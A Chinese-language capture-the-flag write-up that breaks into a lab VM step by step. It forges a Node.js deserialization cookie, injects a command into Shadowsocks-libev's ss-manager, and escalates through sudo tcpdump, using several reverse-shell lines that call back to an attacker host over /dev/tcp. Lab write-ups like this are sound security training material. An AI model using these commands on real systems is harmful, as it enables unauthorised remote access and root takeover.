## port scan

```shell
# Nmap 7.94SVN scan initiated Fri Nov 15 01:26:22 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.56.134
Nmap scan report for 192.168.56.134
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
666/tcp open  doom
MAC Address: 08:00:27:EF:5E:1B (Oracle VirtualBox virtual NIC)
```

```shell
# Nmap 7.94SVN scan initiated Fri Nov 15 01:27:20 2024 as: nmap -sT -sV -sC -O -p22,666 -oN nmap_results/detils_scan 192.168.56.134
Nmap scan report for 192.168.56.134
Host is up (0.0011s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)
666/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:EF:5E:1B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

666端口是web端

vuln_scan

```shell
nmap --script=vuln -p666 -oN nmap_results/vuln_scan 192.168.56.134
```

## web

刚开始的时候，网站还可以访问

然后就是报错了，json中出现语法错误

![image-20241115221206175](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115221206175.png)

观察Cooike发现是base64编码

![image-20241115221505102](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115221505102.png)

```
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}
```

这里在`Friday`单词前面少了个引号

```
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
```

替换Cookie成功登录，后台只是一句话`hello,admin`

往回看报错信息，`Object.exports.unserialize`有个反序列化函数

`node.js`有漏洞，可以执行命令

![image-20241115222046584](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115222046584.png)

利用`49552.py`,可以成功执行命令

`python2 49552.py`

```
rlwrap nc -lvnp 445
```

拿到`nodeadmin`的shell

## 提权

```bash
[nodeadmin@localhost ~]$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/sbin/userhelper
/usr/sbin/pam_timestamp_check
/usr/sbin/mtr-packet
/usr/sbin/usernetctl
/usr/sbin/exim
......
```

```shell
[nodeadmin@localhost ~]$ /usr/sbin/exim --version
/usr/sbin/exim --version
Exim version 4.91 #2 built 19-Apr-2018 15:50:32
```

`exim4.91`应该是可以提权的，但是我没成功

![image-20241115224155768](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115224155768.png)

查看`passwd`文件

```bash
[nodeadmin@localhost ~]$ cat /etc/passwd | grep -v 'nologin'
cat /etc/passwd | grep -v 'nologin'
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash
fireman:x:1002:1002::/home/fireman:/bin/bash
```

有个`fireman`用户，家目录进不去

### Shadowsocks-libev漏洞利用

查看进程，找到`ss-manager`

**Shadowsocks-libev** 是一款轻量级的代理软件，常用于科学上网和隐私保护。它基于 Socks5 协议，支持加密和安全通信。

```shell
nodeadmin@localhost ~]$ ps -aux | grep 'fireman'
ps -aux | grep 'fireman'
root       816  0.0  0.1 301464  4592 ?        S    01:36   0:00 su fireman -c /usr/local/bin/ss-manager
fireman    820  0.0  0.0  37072  3932 ?        Ss   01:36   0:00 /usr/local/bin/ss-manager
nodeadm+  3874  0.0  0.0 213788   968 ?        S    09:45   0:00 grep --color=auto fireman
```

![image-20241115225019047](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115225019047.png)

利用方法，先使用nc连接本地`udp`端口8839，反弹shell

```
nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"||/bin/bash -i >& /dev/tcp/192.168.56.128/1234 0>&1||"}
```

![image-20241115225903381](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115225903381.png)

### sudo提权

查看sudo权限

```shell
[fireman@localhost ~]$ sudo -l
sudo -l
Matching Defaults entries for fireman on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

![image-20241115230940459](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241115230940459.png)

```shell
fireman@localhost ~]$ echo "/bin/bash -i >& /dev/tcp/192.168.56.128/1235 0>&1" > 1.sh
<ash -i >& /dev/tcp/192.168.56.128/1235 0>&1" > 1.sh
[fireman@localhost ~]$ cat 1.sh
cat 1.sh
/bin/bash -i >& /dev/tcp/192.168.56.128/1235 0>&1
[fireman@localhost ~]$ chmod +x 1.sh
chmod +x 1.sh
```

修改网卡名称

```shell
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /home/fireman/1.sh -Z root
```

```shell
[root@localhost ~]# ls
ls
flag.txt
[root@localhost ~]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@localhost ~]# cat flag.txt
cat flag.txt
[+] You're a soldier. 
[+] One of the best that the world could set against
[+] the demonic invasion.  

                FLAG: kre0cu4jl4rzjicpo1i7z5l1     

[+] Congratulations on completing this VM & I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther
```

